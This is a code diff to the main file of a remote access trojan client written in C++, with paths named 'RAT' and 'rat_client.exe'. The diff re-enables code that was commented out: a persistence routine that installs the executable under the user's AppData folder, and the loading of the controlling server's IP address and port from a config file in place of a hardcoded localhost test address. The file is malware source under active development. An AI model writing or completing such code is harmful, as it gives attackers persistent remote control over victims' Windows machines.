@@ -1,18 +1,13 @@
 #include <iostream>
 #include <string>
 #include "include/socketconnection.h"
-/* #include "include/persist.h" */
+#include "include/persist.h"
 #include "include/keys.h"
 #include "include/crypto.h"
 
 int main() {
     std::string keyAes;
-
-
-
-
-
-/*     std::filesystem::path appdata_path = getAppDataPath();
+    std::filesystem::path appdata_path = getAppDataPath();
 
     if (appdata_path.empty()) {
         //std::cerr << "Could not find appdata variable. exiting..\n";
@@ -21,6 +16,8 @@ int main() {
 
     std::filesystem::path conf_path =  appdata_path / "RAT" / "rat_client.conf";
     std::filesystem::path malware_path = appdata_path / "RAT" / "rat_client.exe";
+    std::string ip;
+    int port;
 
 
     // ---------- MALWARE FILE ----------
@@ -70,27 +67,26 @@ int main() {
 
     } else {
         //std::cout << "Persistence already exists." << std::endl;
-    } */
+    }
 
 
     // ---------- CONNECTION INFO ----------
-/*     if (fileExist(conf_path)) {
+    if (fileExist(conf_path)) {
         // load configuration parameters
         auto config = loadConfig(conf_path);
         
         if (config.find("ip_address") != config.end() && config.find("port") != config.end()) {
-            const std::string ip = config["ip_address"];
-            const int port = std::stoi(config["port"]);
+            ip = config["ip_address"];
+            port = std::stoi(config["port"]);
         } else {
             //std::cout << "Could not read paremeters." << std::endl;
             return 1;
         }
     }
- */
 
     // ---------- CONNECTION ----------
-    const std::string ip = "127.0.0.1";
-    const int port = 8888;
+    // const std::string ip = "127.0.0.1";
+    // const int port = 8888;
 
     if (!initWinsock()) return 1;
 
